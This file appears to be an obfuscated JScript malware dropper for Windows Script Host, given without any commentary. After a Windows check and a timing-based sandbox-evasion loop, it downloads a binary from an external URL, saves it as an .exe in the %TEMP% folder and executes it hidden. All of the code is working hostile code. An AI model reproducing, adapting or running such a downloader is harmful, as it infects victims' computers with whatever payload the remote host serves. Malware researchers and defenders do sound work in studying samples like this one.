var _O = false;
var _W = "CreateObject";
var _I = function _WS() {return WScript[_W]("WScript"+".Shell");}(), _A = 11;
var _PT = "MSXML2.XMLHTTP";
var _M = 2123213;
var _ZE = 0;
function _HM(_MT){_I["Run"](_MT, _ZE, _ZE);};
function _IH(){return _PT + "";};
function _TX(_E, _C0){_ZE = _ZE * 1; return _E - _C0;};
function _P(){return _W;};
/*@cc_on
  @if (@_win32 || @_win64)
    _O = true;
  @end
@*/
if (_O)
{
var _J = "";
function _F(){return 22;};
var _XL = 0; var _LJ = 0;
function _HU()
{
var _B = new this["Date"]();
var _C = _B["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _B = new this["Date"]();
var _DB = _B["getUTCMilliseconds"]();
WScript["Sleep"](_F());
var _B = new this["Date"]();
var _G0 = _B["getUTCMilliseconds"]();
var _XL = "_L";
_XL = _TX(_DB, _C);
var _LJ = "_UA";
_LJ = _TX(_G0, _DB);
_J = "open";
return _TX(_XL, _LJ);
}
var _RR = false;
var _U = false;
for (var _RE = _ZE; _RE < _F() * 1; _RE++){if (_HU() != _ZE){
_RR = true; 
_LJ = "31" + 11 * _XL + _LJ; 
_U = true; 
break;
}}
function _BK() {return ((_RR == true) && (_RR == _U)) ? 1 : _ZE;};
if (_RR && _BK() && _U){
function _T() {return _I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ko9p3BDDVHZ0.ex" + "e";};
 _DQ = _IH();
 _O0 = WScript[_W](_DQ);
 var _MA = 1;
 while (_MA){
try {
	if (_MA == 1)
	{
		_O0[_J]("GET", "http://pro.monbento.com/n3iska", false);
		_O0["send"]();
		_CB = "Sleep";
	}
	WScript[_CB](_F() + 120); 
	if (_O0["readystate"] < 2 * 2) continue;
	_MA = _ZE;
	function _Z(_QD) {var _Y = (1, 2, 3, 4, 5, _QD); return _Y;};
	_V = WScript[_P()]("ADODB.Stream");
	_DQ = _V;
	_DQ[_J]();
	_DQ["type"] = _Z(1);
	_DQ["write"](_O0["ResponseBody"]);
	_V["position"] = _Z(_ZE);
	_DQ["Save" + "ToFile"](_T(), 2);
	_V["cl"+"ose"]();
	_G = _T();
	_HM(_G);
} catch(_VK){};
}
}
}

